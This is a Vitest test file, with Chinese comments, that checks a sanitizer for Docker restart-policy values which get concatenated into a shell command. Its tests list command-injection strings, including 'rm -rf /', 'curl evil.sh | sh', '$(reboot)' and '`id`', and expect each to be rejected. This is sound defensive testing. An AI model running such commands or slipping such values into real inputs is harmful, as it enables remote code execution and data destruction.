/**
 * Docker restart 策略校验测试 — 2026-05-29 Codex review(PR #684, P1 安全):
 * restartPolicy 会被拼进经 shell 执行的 docker run 字符串,必须按白名单校验,
 * 杜绝 `no; touch /tmp/pwn` 这类命令注入。本测试锁住合法集合 + 注入回落。
 */
import { describe, it, expect } from 'vitest';
import {
  sanitizeDockerRestartPolicy,
  isValidDockerRestartPolicy,
  DEFAULT_DOCKER_RESTART_POLICY,
} from '../../src/config/docker-restart-policy.js';

describe('isValidDockerRestartPolicy', () => {
  it('Docker 合法策略全部通过', () => {
    for (const v of ['no', 'always', 'unless-stopped', 'on-failure', 'on-failure:3', 'on-failure:10']) {
      expect(isValidDockerRestartPolicy(v)).toBe(true);
    }
  });
  it('非法值一律拒绝', () => {
    for (const v of ['', '  ', 'maybe', 'on-failure:', 'on-failure:x', 'always ; rm -rf /', undefined, 42]) {
      expect(isValidDockerRestartPolicy(v as unknown)).toBe(false);
    }
  });
});

describe('sanitizeDockerRestartPolicy', () => {
  it('合法值原样返回(trim)', () => {
    expect(sanitizeDockerRestartPolicy('unless-stopped')).toBe('unless-stopped');
    expect(sanitizeDockerRestartPolicy('  on-failure:5  ')).toBe('on-failure:5');
  });

  it('命令注入 payload → 回落默认,绝不透传(P1 安全核心断言)', () => {
    expect(sanitizeDockerRestartPolicy('no; touch /tmp/pwn')).toBe(DEFAULT_DOCKER_RESTART_POLICY);
    expect(sanitizeDockerRestartPolicy('always && curl evil.sh | sh')).toBe(DEFAULT_DOCKER_RESTART_POLICY);
    expect(sanitizeDockerRestartPolicy('$(reboot)')).toBe(DEFAULT_DOCKER_RESTART_POLICY);
    expect(sanitizeDockerRestartPolicy('`id`')).toBe(DEFAULT_DOCKER_RESTART_POLICY);
  });

  it('空 / undefined / 非字符串 → 默认', () => {
    expect(sanitizeDockerRestartPolicy(undefined)).toBe(DEFAULT_DOCKER_RESTART_POLICY);
    expect(sanitizeDockerRestartPolicy('')).toBe(DEFAULT_DOCKER_RESTART_POLICY);
    expect(sanitizeDockerRestartPolicy(123 as unknown)).toBe(DEFAULT_DOCKER_RESTART_POLICY);
  });
});
